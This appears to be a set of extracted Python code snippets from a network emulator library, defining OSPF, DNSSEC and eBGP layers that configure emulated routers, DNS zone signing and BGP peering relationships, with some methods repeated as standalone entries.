  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'OspfLayer:\\n'\n\n        indent += 4\n\n        out += ' ' * indent\n        out += 'Stub Networks:\\n'\n        indent += 4\n        for (scope, netname) in self.__stubs:\n            out += ' ' * indent\n            out += 'as{}/{}\\n'.format(scope, netname)\n        indent -= 4\n\n        out += ' ' * indent\n        out += 'Masked Networks:\\n'\n        indent += 4\n        for (scope, netname) in self.__masked:\n            out += ' ' * indent\n            out += 'as{}/{}\\n'.format(scope, netname)\n        indent -= 4\n\n        out += ' ' * indent\n        out += 'Masked AS:\\n'\n        indent += 4\n        for asn in self.__masked_asn:\n            out += ' ' * indent\n            out += 'as{}\\n'.format(asn)\n\n        return out",
  "class Dnssec(Layer):\n    \"\"\"!\n    @brief The Dnssec (DNSSEC) layer.\n\n    This layer helps setting up DNSSEC. It works by signing the zones and send\n    the DS record to parent(s) with nsupdate. Note that to build a DNSSEC\n    infrastructure, you will need to sign the entire chain. You will also need\n    working local DNS server configured on the node hosting the zone for it to\n    find the parent name server.\n    \"\"\"\n\n    __zonenames: Set[str]\n\n    def __init__(self):\n        \"\"\"!\n        @brief Dnssec layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__zonenames = set()\n        self.addDependency('DomainNameService', False, False)\n\n    def __findZoneNode(self, dns: DomainNameService, zonename: str) -> Node:\n        targets = dns.getTargets()\n        for (server, node) in targets:\n            dns_s: DomainNameServer = server\n            zones = dns_s.getZones()\n            for zone in zones:\n                # TODO: what if multiple nodes host the same zone?\n                if zone == zonename: return node\n\n        return None\n\n    def getName(self):\n        return 'Dnssec'\n    \n    def enableOn(self, zonename: str) -> Dnssec:\n        \"\"\"!\n        @brief Enable DNSSEC on the given zone.\n\n        @param zonename zonename. \n\n        @returns self, for chaining API calls.\n        \"\"\"\n        if zonename[-1] != '.': zonename += '.'\n        self.__zonenames.add(zonename)\n\n        return self\n\n    def getEnabledZones(self) -> Set[str]:\n        \"\"\"!\n        @brief Get set of zonenames with DNSSEC enabled.\n        \n        @return set of zonenames.\n        \"\"\"\n        return self.__zonenames\n\n    def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        dns: DomainNameService = reg.get('seedemu', 'layer', 'DomainNameService')\n        nodes: Set[Node] = set()\n        for zonename in self.__zonenames:\n            self._log('Looking for server hosting \"{}\"...'.format(zonename))\n            node = self.__findZoneNode(dns, zonename)\n            \n            assert node != None, 'no server found for dnssec-enabled zone {}'.format(zonename)\n\n            (scope, _, name) = node.getRegistryInfo()\n            self._log('Setting up DNSSEC for \"{}\" on as{}/{}'.format(zonename, scope, name))\n            nodes.add(node)\n            node.appendFile('/dnssec_zones.txt', '{}\\n'.format(zonename))\n\n        for node in nodes:\n            node.appendFile('/enable_dnssec', DnssecFileTemplates['enable_dnssec_script'])\n            node.appendStartCommand('chmod +x /enable_dnssec')\n            node.appendStartCommand('/enable_dnssec')\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DnssecLayer:\\n'\n\n        indent += 4\n\n        out += ' ' * indent\n        out += 'DNSSEC-enabled zones:\\n'\n\n        for zonename in self.__zonenames:\n            out += ' ' * indent\n            out += '{}\\n'.format(zonename)\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief Dnssec layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__zonenames = set()\n        self.addDependency('DomainNameService', False, False)",
  "def __findZoneNode(self, dns: DomainNameService, zonename: str) -> Node:\n        targets = dns.getTargets()\n        for (server, node) in targets:\n            dns_s: DomainNameServer = server\n            zones = dns_s.getZones()\n            for zone in zones:\n                # TODO: what if multiple nodes host the same zone?\n                if zone == zonename: return node\n\n        return None",
  "def getName(self):\n        return 'Dnssec'",
  "def enableOn(self, zonename: str) -> Dnssec:\n        \"\"\"!\n        @brief Enable DNSSEC on the given zone.\n\n        @param zonename zonename. \n\n        @returns self, for chaining API calls.\n        \"\"\"\n        if zonename[-1] != '.': zonename += '.'\n        self.__zonenames.add(zonename)\n\n        return self",
  "def getEnabledZones(self) -> Set[str]:\n        \"\"\"!\n        @brief Get set of zonenames with DNSSEC enabled.\n        \n        @return set of zonenames.\n        \"\"\"\n        return self.__zonenames",
  "def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        dns: DomainNameService = reg.get('seedemu', 'layer', 'DomainNameService')\n        nodes: Set[Node] = set()\n        for zonename in self.__zonenames:\n            self._log('Looking for server hosting \"{}\"...'.format(zonename))\n            node = self.__findZoneNode(dns, zonename)\n            \n            assert node != None, 'no server found for dnssec-enabled zone {}'.format(zonename)\n\n            (scope, _, name) = node.getRegistryInfo()\n            self._log('Setting up DNSSEC for \"{}\" on as{}/{}'.format(zonename, scope, name))\n            nodes.add(node)\n            node.appendFile('/dnssec_zones.txt', '{}\\n'.format(zonename))\n\n        for node in nodes:\n            node.appendFile('/enable_dnssec', DnssecFileTemplates['enable_dnssec_script'])\n            node.appendStartCommand('chmod +x /enable_dnssec')\n            node.appendStartCommand('/enable_dnssec')",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DnssecLayer:\\n'\n\n        indent += 4\n\n        out += ' ' * indent\n        out += 'DNSSEC-enabled zones:\\n'\n\n        for zonename in self.__zonenames:\n            out += ' ' * indent\n            out += '{}\\n'.format(zonename)\n\n        return out",
  "class PeerRelationship(Enum):\n    \"\"\"!\n    @brief Relationship between peers.\n    \"\"\"\n\n    ## Provider: a side: export everything, b side: export only customer's and\n    ## own prefixes\n    Provider = \"Provider\"\n\n    ## Peer: a side & b side: only export customer's and own prefixes.\n    Peer = \"Peer\"\n\n    ## Unfiltered: no filter on both sides\n    Unfiltered = \"Unfiltered\"",
  "class Ebgp(Layer, Graphable):\n    \"\"\"!\n    @brief The Ebgp (eBGP) layer.\n\n    This layer enable eBGP peering in InternetExchange.\n    \"\"\"\n\n    __peerings: Dict[Tuple[int, int, int], PeerRelationship]\n    __rs_peers: List[Tuple[int, int]]\n    __xc_peerings: Dict[Tuple[int, int], PeerRelationship]\n\n    def __init__(self):\n        \"\"\"!\n        @brief Ebgp layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__peerings = {}\n        self.__xc_peerings = {}\n        self.__rs_peers = []\n        self.addDependency('Routing', False, False)\n\n    def __createPeer(self, nodeA: Router, nodeB: Router, addrA: str, addrB: str, rel: PeerRelationship) -> None:\n\n        rsNode: Router = None\n        routerA: Router = None\n        routerB: Router = None\n\n        # for both nodes\n        for node in [nodeA, nodeB]:\n            if node.getRole() == NodeRole.RouteServer:\n                rsNode = node\n                continue\n            \n            if routerA == None: routerA = node\n            elif routerB == None: routerB = node\n\n            if not node.getAttribute('__bgp_bootstrapped', False):\n                self._log('Bootstrapping as{}/{} for BGP...'.format(node.getAsn(), node.getName()))\n                \n                node.setAttribute('__bgp_bootstrapped', True)\n                node.appendFile('/etc/bird/bird.conf', EbgpFileTemplates['bgp_commons'].format(localAsn = node.getAsn()))\n\n            # create table for bgp\n            node.addTable('t_bgp')\n\n            # pipe all routes in bgp table to main table\n            node.addTablePipe('t_bgp')\n\n            # pipe direct routes to bgp, set LOCAL community, set pref 40\n            node.addTablePipe('t_direct', 't_bgp', exportFilter = 'filter { bgp_large_community.add(LOCAL_COMM); bgp_local_pref = 40; accept; }')\n\n\n\n        assert routerA != None, 'both nodes are RS node. cannot setup peering.'\n        assert routerA != routerB, 'cannot peer with oneself.'\n\n        if rsNode != None:\n            rsNode.addProtocol('bgp', 'p_as{}'.format(routerA.getAsn()), EbgpFileTemplates[\"rs_bird_peer\"].format(\n                localAddress = addrA,\n                localAsn = rsNode.getAsn(),\n                peerAddress = addrB,\n                peerAsn = routerA.getAsn()\n            ))\n\n            routerA.addProtocol('bgp', 'p_rs{}'.format(rsNode.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrB,\n                localAsn = routerA.getAsn(),\n                peerAddress = addrA,\n                peerAsn = rsNode.getAsn(),\n                exportFilter = \"where bgp_large_community ~ [LOCAL_COMM, CUSTOMER_COMM]\",\n                importCommunity = \"PEER_COMM\",\n                bgpPref = 20\n            ))\n\n            return\n        \n        if rel == PeerRelationship.Peer:\n            routerA.addProtocol('bgp', 'p_as{}'.format(routerB.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrA,\n                localAsn = routerA.getAsn(),\n                peerAddress = addrB,\n                peerAsn = routerB.getAsn(),\n                exportFilter = \"where bgp_large_community ~ [LOCAL_COMM, CUSTOMER_COMM]\",\n                importCommunity = \"PEER_COMM\",\n                bgpPref = 20\n            ))\n\n            routerB.addProtocol('bgp', 'p_as{}'.format(routerA.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrB,\n                localAsn = routerB.getAsn(),\n                peerAddress = addrA,\n                peerAsn = routerA.getAsn(),\n                exportFilter = \"where bgp_large_community ~ [LOCAL_COMM, CUSTOMER_COMM]\",\n                importCommunity = \"PEER_COMM\",\n                bgpPref = 20\n            ))\n\n        if rel == PeerRelationship.Provider:\n            routerA.addProtocol('bgp', 'c_as{}'.format(routerB.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrA,\n                localAsn = routerA.getAsn(),\n                peerAddress = addrB,\n                peerAsn = routerB.getAsn(),\n                exportFilter = \"all\",\n                importCommunity = \"CUSTOMER_COMM\",\n                bgpPref = 30\n            ))\n\n            routerB.addProtocol('bgp', 'u_as{}'.format(routerA.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrB,\n                localAsn = routerB.getAsn(),\n                peerAddress = addrA,\n                peerAsn = routerA.getAsn(),\n                exportFilter = \"where bgp_large_community ~ [LOCAL_COMM, CUSTOMER_COMM]\",\n                importCommunity = \"PROVIDER_COMM\",\n                bgpPref = 10\n            ))\n\n        if rel == PeerRelationship.Unfiltered:\n            routerA.addProtocol('bgp', 'x_as{}'.format(routerB.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrA,\n                localAsn = routerA.getAsn(),\n                peerAddress = addrB,\n                peerAsn = routerB.getAsn(),\n                exportFilter = \"all\",\n                importCommunity = \"CUSTOMER_COMM\",\n                bgpPref = 30\n            ))\n\n            routerB.addProtocol('bgp', 'x_as{}'.format(routerA.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrB,\n                localAsn = routerB.getAsn(),\n                peerAddress = addrA,\n                peerAsn = routerA.getAsn(),\n                exportFilter = \"all\",\n                importCommunity = \"PROVIDER_COMM\",\n                bgpPref = 10\n            ))   \n\n    def getName(self) -> str:\n        return \"Ebgp\"\n\n    def addPrivatePeering(self, ix: int, a: int, b: int, abRelationship: PeerRelationship = PeerRelationship.Peer) -> Ebgp:\n        \"\"\"!\n        @brief Setup private peering between two ASes in IX.\n\n        @param ix IXP id.\n        @param a First ASN.\n        @param b Second ASN.\n        @param abRelationship (optional) A and B's relationship. If set to\n        PeerRelationship.Provider, A will export everything to B, if set to\n        PeerRelationship.Peer, A will only export own and customer prefixes to\n        B. Default to Peer.\n\n        @throws AssertionError if peering already exist.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert (ix, a, b) not in self.__peerings, '{} <-> {} already peered at IX{}'.format(a, b, ix)\n        assert (ix, b, a) not in self.__peerings, '{} <-> {} already peered at IX{}'.format(b, a, ix)\n        assert abRelationship == PeerRelationship.Peer or abRelationship == PeerRelationship.Provider or abRelationship == PeerRelationship.Unfiltered, 'unknown peering relationship {}'.format(abRelationship)\n\n        self.__peerings[(ix, a, b)] = abRelationship\n\n        return self\n\n    def addPrivatePeerings(self, ix: int, a_asns: List[int], b_asns: List[int], abRelationship: PeerRelationship = PeerRelationship.Peer) -> Ebgp:\n        \"\"\"!\n        @brief Setup private peering between two sets of ASes in IX.\n\n        @param ix IXP id.\n        @param a_asns First set of ASNs.\n        @param b_asns Second set of ASNs.\n        @param abRelationship (optional) A and B's relationship. If set to\n        PeerRelationship.Provider, A will export everything to B, if set to\n        PeerRelationship.Peer, A will only export own and customer prefixes to\n        B. Default to Peer.\n\n        @throws AssertionError if peering already exist.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        for a in a_asns:\n            for b in b_asns:\n                self.addPrivatePeering(ix, a, b, abRelationship)\n\n        return self\n\n    def getPrivatePeerings(self) -> Dict[Tuple[int, int, int], PeerRelationship]:\n        \"\"\"!\n        @brief Get private peerings.\n\n        @returns dict, where key is tuple of (ix, asnA, asnB) and value is peering relationship.\n        \"\"\"\n        return self.__peerings\n\n    def addCrossConnectPeering(self, a: int, b: int, abRelationship: PeerRelationship = PeerRelationship.Peer) -> Ebgp:\n        \"\"\"!\n        @brief add cross-connect peering.\n\n        @param a First ASN.\n        @param b Second ASN.\n        @param abRelationship (optional) A and B's relationship. If set to\n        PeerRelationship.Provider, A will export everything to B, if set to\n        PeerRelationship.Peer, A will only export own and customer prefixes to\n        B. Default to Peer.\n\n        @throws AssertionError if peering already exist.\n        \n        @returns self, for chaining API calls.\n        \"\"\"\n        assert (a, b) not in self.__xc_peerings, '{} <-> {} already configured as XC peer'.format(a, b)\n        assert (b, a) not in self.__xc_peerings, '{} <-> {} already configured as XC peer'.format(b, a)\n        assert abRelationship == PeerRelationship.Peer or abRelationship == PeerRelationship.Provider or abRelationship == PeerRelationship.Unfiltered, 'unknown peering relationship {}'.format(abRelationship)\n\n        self.__xc_peerings[(a, b)] = abRelationship\n\n        return self\n\n    def getCrossConnectPeerings(self) -> Dict[Tuple[int, int], PeerRelationship]:\n        \"\"\"!\n        @brief get cross-connect peerings.\n\n        @returns dict,  where key is tuple of (asnA, asnB) and value is peering relationship.\n        \"\"\"\n        return self.__xc_peerings\n\n    def addRsPeer(self, ix: int, peer: int) -> Ebgp:\n        \"\"\"!\n        @brief Setup RS peering for an AS.\n\n        @param ix IXP id.\n        @param peer Participant ASN.\n\n        @throws AssertionError if peering already exist.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert (ix, peer) not in self.__rs_peers, '{} already peered with RS at IX{}'.format(peer, ix)\n\n        self.__rs_peers.append((ix, peer))\n\n        return self\n\n    def addRsPeers(self, ix: int, peers: List[int]):\n        \"\"\"!\n        @brief Setup RS peering for list of ASes.\n\n        @param ix IXP id.\n        @param peers List of participant ASNs.\n\n        @throws AssertionError if some peering already exist.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        for peer in peers:\n            self.addRsPeer(ix, peer)\n\n        return self\n\n    def getRsPeers(self) -> List[Tuple[int, int]]:\n        \"\"\"!\n        @brief Get RS peers.\n\n        @returns list of tuple of (ix, peerAsn)\n        \"\"\"\n        return self.__rs_peers \n\n    def configure(self, emulator: Emulator) -> None:\n        reg = emulator.getRegistry()\n\n        for (ix, peer) in self.__rs_peers:\n            ix_reg = ScopedRegistry('ix', reg)\n            p_reg = ScopedRegistry(str(peer), reg)\n\n            ix_net: Network = ix_reg.get('net', 'ix{}'.format(ix))\n            ix_rs: Router = ix_reg.get('rs', 'ix{}'.format(ix))\n            rs_ifs = ix_rs.getInterfaces()\n            assert len(rs_ifs) == 1, '??? ix{} rs has {} interfaces.'.format(ix, len(rs_ifs))\n            rs_if = rs_ifs[0]\n\n            p_rnodes: List[Router] = p_reg.getByType('rnode')\n            p_ixnode: Router = None\n            p_ixif: Interface = None\n            for node in p_rnodes:\n                if p_ixnode != None: break\n                for iface in node.getInterfaces():\n                    if iface.getNet() == ix_net:\n                        p_ixnode = node\n                        p_ixif = iface\n                        break\n\n            assert p_ixnode != None, 'cannot resolve peering: as{} not in ix{}'.format(peer, ix)\n            self._log(\"adding peering: {} as {} (RS) <-> {} as {}\".format(rs_if.getAddress(), ix, p_ixif.getAddress(), peer))\n\n            self.__createPeer(ix_rs, p_ixnode, rs_if.getAddress(), p_ixif.getAddress(), PeerRelationship.Peer)\n\n        for (a, b), rel in self.__xc_peerings.items():\n            a_reg = ScopedRegistry(str(a), reg)\n            b_reg = ScopedRegistry(str(b), reg)\n\n            a_router: Router = None\n            b_router: Router = None\n\n            a_addr: str = None\n            b_addr: str = None\n\n            hit = False\n\n            for node in a_reg.getByType('rnode'):\n                router: Router = node\n                for (peername, peerasn), (localaddr, _) in router.getCrossConnects().items():\n                    if peerasn != b: continue\n                    if not b_reg.has('rnode', peername): continue\n\n                    hit = True\n                    a_router = node\n                    b_router = b_reg.get('rnode', peername)\n\n                    a_addr = str(localaddr.ip)\n                    (b_ifaddr, _) = b_router.getCrossConnect(a, a_router.getName())\n                    b_addr = str(b_ifaddr.ip)\n\n                    break\n                if hit: break\n\n            assert hit, 'cannot find XC to configure peer AS{} <--> AS{}'.format(a, b)\n\n            self._log(\"adding XC peering: {} as {} <-({})-> {} as {}\".format(a_addr, a, rel, b_addr, b))\n\n            self.__createPeer(a_router, b_router, a_addr, b_addr, rel)\n\n        for (ix, a, b), rel in self.__peerings.items():\n            ix_reg = ScopedRegistry('ix', reg)\n            a_reg = ScopedRegistry(str(a), reg)\n            b_reg = ScopedRegistry(str(b), reg)\n\n            ix_net: Network = ix_reg.get('net', 'ix{}'.format(ix))\n            a_rnodes: List[Router] = a_reg.getByType('rnode')\n            b_rnodes: List[Router] = b_reg.getByType('rnode')\n\n            a_ixnode: Router = None\n            a_ixif: Interface = None\n            for node in a_rnodes:\n                if a_ixnode != None: break\n                for iface in node.getInterfaces():\n                    if iface.getNet() == ix_net:\n                        a_ixnode = node\n                        a_ixif = iface\n                        break\n            \n            assert a_ixnode != None, 'cannot resolve peering: as{} not in ix{}'.format(a, ix)\n\n            b_ixnode: Router = None\n            b_ixif: Interface = None\n            for node in b_rnodes:\n                if b_ixnode != None: break\n                for iface in node.getInterfaces():\n                    if iface.getNet() == ix_net:\n                        b_ixnode = node\n                        b_ixif = iface\n                        break\n            \n            assert b_ixnode != None, 'cannot resolve peering: as{} not in ix{}'.format(b, ix)\n\n            self._log(\"adding IX peering: {} as {} <-({})-> {} as {}\".format(a_ixif.getAddress(), a, rel, b_ixif.getAddress(), b))\n\n            self.__createPeer(a_ixnode, b_ixnode, a_ixif.getAddress(), b_ixif.getAddress(), rel)\n\n    def render(self, emulator: Emulator) -> None:\n        pass\n\n    def _doCreateGraphs(self, emulator: Emulator):\n        # creates the following:\n        # - ebgp peering, all ASes in one graph\n        # - ebgp peering, one for each ix\n        # mlpa peer (i.e., via rs): dashed line\n        # private peer: solid line\n\n        full_graph = self._addGraph('All Peering Sessions', False)\n\n        ix_list = set()\n        for (i, _) in self.__rs_peers: ix_list.add(i)\n        for (i, _, _), _ in self.__peerings.items(): ix_list.add(i)\n        for ix in ix_list:\n            self._log('Creating RS peering sessions graph for IX{}...'.format(ix))\n            ix_graph = self._addGraph('IX{} Peering Sessions'.format(ix), False)\n\n            mesh_ases = set()\n            \n            for (i, a) in self.__rs_peers:\n                if i == ix: mesh_ases.add(a)\n            \n            self._log('IX{} RS-mesh: {}'.format(ix, mesh_ases))\n\n            while len(mesh_ases) > 0:\n                a = mesh_ases.pop()\n                if not full_graph.hasVertex('AS{}'.format(a), 'IX{}'.format(ix)):\n                    full_graph.addVertex('AS{}'.format(a), 'IX{}'.format(ix))\n                if not ix_graph.hasVertex('AS{}'.format(a), 'IX{}'.format(ix)):\n                    ix_graph.addVertex('AS{}'.format(a), 'IX{}'.format(ix))\n                for b in mesh_ases:\n                    if not full_graph.hasVertex('AS{}'.format(b), 'IX{}'.format(ix)):\n                        full_graph.addVertex('AS{}'.format(b), 'IX{}'.format(ix))\n                    if not ix_graph.hasVertex('AS{}'.format(b), 'IX{}'.format(ix)):\n                        ix_graph.addVertex('AS{}'.format(b), 'IX{}'.format(ix))\n\n                    full_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(ix), 'IX{}'.format(ix), style = 'dashed', alabel = 'R', blabel= 'R')\n                    ix_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(ix), 'IX{}'.format(ix), style = 'dashed', alabel = 'R', blabel= 'R')\n                    \n        for (i, a, b), rel in self.__peerings.items():\n            self._log('Creating private peering sessions graph for IX{} AS{} <-> AS{}...'.format(i, a, b))\n\n            ix_graph = self._addGraph('IX{} Peering Sessions'.format(i), False)\n\n            if not full_graph.hasVertex('AS{}'.format(a), 'IX{}'.format(i)):\n                full_graph.addVertex('AS{}'.format(a), 'IX{}'.format(i))\n            if not ix_graph.hasVertex('AS{}'.format(a), 'IX{}'.format(i)):\n                ix_graph.addVertex('AS{}'.format(a), 'IX{}'.format(i))\n\n            if not full_graph.hasVertex('AS{}'.format(b), 'IX{}'.format(i)):\n                full_graph.addVertex('AS{}'.format(b), 'IX{}'.format(i))\n            if not ix_graph.hasVertex('AS{}'.format(b), 'IX{}'.format(i)):\n                ix_graph.addVertex('AS{}'.format(b), 'IX{}'.format(i))\n\n            if rel == PeerRelationship.Peer:\n                full_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'P', blabel= 'P')\n                ix_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'P', blabel= 'P')\n\n            if rel == PeerRelationship.Provider:    \n                full_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'U', blabel = 'C')\n                ix_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'U', blabel = 'C')\n\n            if rel == PeerRelationship.Unfiltered:\n                full_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'X', blabel= 'X')\n                ix_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'X', blabel= 'X')\n\n        # todo: XC peering graphs\n\n        es = list(full_graph.vertices.values())\n        while len(es) > 0:\n            a = es.pop()\n            for b in es:\n                if a.name == b.name:\n                    full_graph.addEdge(a.name, b.name, a.group, b.group, style = 'dotted', alabel = 'I', blabel= 'I')\n\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'EbgpLayer:\\n'\n\n        indent += 4\n        for (i, a) in self.__rs_peers:\n            out += ' ' * indent\n            out += 'IX{}: RS <-> AS{}\\n'.format(i, a)\n\n        for (i, a, b), rel in self.__peerings.items():\n            out += ' ' * indent\n            out += 'IX{}: AS{} <--({})--> AS{}\\n'.format(i, a, rel, b)\n\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief Ebgp layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__peerings = {}\n        self.__xc_peerings = {}\n        self.__rs_peers = []\n        self.addDependency('Routing', False, False)",
  "def __createPeer(self, nodeA: Router, nodeB: Router, addrA: str, addrB: str, rel: PeerRelationship) -> None:\n\n        rsNode: Router = None\n        routerA: Router = None\n        routerB: Router = None\n\n        # for both nodes\n        for node in [nodeA, nodeB]:\n            if node.getRole() == NodeRole.RouteServer:\n                rsNode = node\n                continue\n            \n            if routerA == None: routerA = node\n            elif routerB == None: routerB = node\n\n            if not node.getAttribute('__bgp_bootstrapped', False):\n                self._log('Bootstrapping as{}/{} for BGP...'.format(node.getAsn(), node.getName()))\n                \n                node.setAttribute('__bgp_bootstrapped', True)\n                node.appendFile('/etc/bird/bird.conf', EbgpFileTemplates['bgp_commons'].format(localAsn = node.getAsn()))\n\n            # create table for bgp\n            node.addTable('t_bgp')\n\n            # pipe all routes in bgp table to main table\n            node.addTablePipe('t_bgp')\n\n            # pipe direct routes to bgp, set LOCAL community, set pref 40\n            node.addTablePipe('t_direct', 't_bgp', exportFilter = 'filter { bgp_large_community.add(LOCAL_COMM); bgp_local_pref = 40; accept; }')\n\n\n\n        assert routerA != None, 'both nodes are RS node. cannot setup peering.'\n        assert routerA != routerB, 'cannot peer with oneself.'\n\n        if rsNode != None:\n            rsNode.addProtocol('bgp', 'p_as{}'.format(routerA.getAsn()), EbgpFileTemplates[\"rs_bird_peer\"].format(\n                localAddress = addrA,\n                localAsn = rsNode.getAsn(),\n                peerAddress = addrB,\n                peerAsn = routerA.getAsn()\n            ))\n\n            routerA.addProtocol('bgp', 'p_rs{}'.format(rsNode.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrB,\n                localAsn = routerA.getAsn(),\n                peerAddress = addrA,\n                peerAsn = rsNode.getAsn(),\n                exportFilter = \"where bgp_large_community ~ [LOCAL_COMM, CUSTOMER_COMM]\",\n                importCommunity = \"PEER_COMM\",\n                bgpPref = 20\n            ))\n\n            return\n        \n        if rel == PeerRelationship.Peer:\n            routerA.addProtocol('bgp', 'p_as{}'.format(routerB.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrA,\n                localAsn = routerA.getAsn(),\n                peerAddress = addrB,\n                peerAsn = routerB.getAsn(),\n                exportFilter = \"where bgp_large_community ~ [LOCAL_COMM, CUSTOMER_COMM]\",\n                importCommunity = \"PEER_COMM\",\n                bgpPref = 20\n            ))\n\n            routerB.addProtocol('bgp', 'p_as{}'.format(routerA.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrB,\n                localAsn = routerB.getAsn(),\n                peerAddress = addrA,\n                peerAsn = routerA.getAsn(),\n                exportFilter = \"where bgp_large_community ~ [LOCAL_COMM, CUSTOMER_COMM]\",\n                importCommunity = \"PEER_COMM\",\n                bgpPref = 20\n            ))\n\n        if rel == PeerRelationship.Provider:\n            routerA.addProtocol('bgp', 'c_as{}'.format(routerB.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrA,\n                localAsn = routerA.getAsn(),\n                peerAddress = addrB,\n                peerAsn = routerB.getAsn(),\n                exportFilter = \"all\",\n                importCommunity = \"CUSTOMER_COMM\",\n                bgpPref = 30\n            ))\n\n            routerB.addProtocol('bgp', 'u_as{}'.format(routerA.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrB,\n                localAsn = routerB.getAsn(),\n                peerAddress = addrA,\n                peerAsn = routerA.getAsn(),\n                exportFilter = \"where bgp_large_community ~ [LOCAL_COMM, CUSTOMER_COMM]\",\n                importCommunity = \"PROVIDER_COMM\",\n                bgpPref = 10\n            ))\n\n        if rel == PeerRelationship.Unfiltered:\n            routerA.addProtocol('bgp', 'x_as{}'.format(routerB.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrA,\n                localAsn = routerA.getAsn(),\n                peerAddress = addrB,\n                peerAsn = routerB.getAsn(),\n                exportFilter = \"all\",\n                importCommunity = \"CUSTOMER_COMM\",\n                bgpPref = 30\n            ))\n\n            routerB.addProtocol('bgp', 'x_as{}'.format(routerA.getAsn()), EbgpFileTemplates[\"rnode_bird_peer\"].format(\n                localAddress = addrB,\n                localAsn = routerB.getAsn(),\n                peerAddress = addrA,\n                peerAsn = routerA.getAsn(),\n                exportFilter = \"all\",\n                importCommunity = \"PROVIDER_COMM\",\n                bgpPref = 10\n            ))",
  "def getName(self) -> str:\n        return \"Ebgp\"",
  "def addPrivatePeering(self, ix: int, a: int, b: int, abRelationship: PeerRelationship = PeerRelationship.Peer) -> Ebgp:\n        \"\"\"!\n        @brief Setup private peering between two ASes in IX.\n\n        @param ix IXP id.\n        @param a First ASN.\n        @param b Second ASN.\n        @param abRelationship (optional) A and B's relationship. If set to\n        PeerRelationship.Provider, A will export everything to B, if set to\n        PeerRelationship.Peer, A will only export own and customer prefixes to\n        B. Default to Peer.\n\n        @throws AssertionError if peering already exist.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert (ix, a, b) not in self.__peerings, '{} <-> {} already peered at IX{}'.format(a, b, ix)\n        assert (ix, b, a) not in self.__peerings, '{} <-> {} already peered at IX{}'.format(b, a, ix)\n        assert abRelationship == PeerRelationship.Peer or abRelationship == PeerRelationship.Provider or abRelationship == PeerRelationship.Unfiltered, 'unknown peering relationship {}'.format(abRelationship)\n\n        self.__peerings[(ix, a, b)] = abRelationship\n\n        return self",
  "def addPrivatePeerings(self, ix: int, a_asns: List[int], b_asns: List[int], abRelationship: PeerRelationship = PeerRelationship.Peer) -> Ebgp:\n        \"\"\"!\n        @brief Setup private peering between two sets of ASes in IX.\n\n        @param ix IXP id.\n        @param a_asns First set of ASNs.\n        @param b_asns Second set of ASNs.\n        @param abRelationship (optional) A and B's relationship. If set to\n        PeerRelationship.Provider, A will export everything to B, if set to\n        PeerRelationship.Peer, A will only export own and customer prefixes to\n        B. Default to Peer.\n\n        @throws AssertionError if peering already exist.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        for a in a_asns:\n            for b in b_asns:\n                self.addPrivatePeering(ix, a, b, abRelationship)\n\n        return self",
  "def getPrivatePeerings(self) -> Dict[Tuple[int, int, int], PeerRelationship]:\n        \"\"\"!\n        @brief Get private peerings.\n\n        @returns dict, where key is tuple of (ix, asnA, asnB) and value is peering relationship.\n        \"\"\"\n        return self.__peerings",
